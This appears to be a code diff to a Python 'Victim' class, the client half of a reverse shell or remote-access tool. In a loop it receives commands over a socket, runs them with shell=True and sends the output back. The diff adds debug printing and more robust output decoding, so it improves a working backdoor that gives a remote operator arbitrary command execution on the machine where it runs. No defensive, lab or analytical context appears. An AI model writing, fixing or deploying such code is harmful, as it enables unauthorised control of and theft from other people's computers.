@@ -18,6 +18,8 @@ class Victim:
         while True:
 
             command = self.client_socket.recv(self.HEADER).decode(self.FORMAT)
+            print(f"[RECV DEBUG] got command: {command}")
+
             if command.lower() == self.DISCONNECTED_MESSAGE:
                 print("[DISCONNECTED]")
                 break
@@ -25,14 +27,17 @@ class Victim:
             print(f"[COMMAND RECEIVED] {command}")
 
             try:
-                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                output = output_bytes.decode("utf-8", errors="replace")
 
             except subprocess.CalledProcessError as e:
-                output = e.output
+                output = e.output.decode("utf-8", errors="replace")
 
             if output == "":
                 print("[EMPTY] output is empty")
                 output = "[EMPTY] output is empty"
+
+            print(f"[SENDING DEBUG] sending result: {output[:50]}...")
 
             self.client_socket.send(output.encode(self.FORMAT))
 
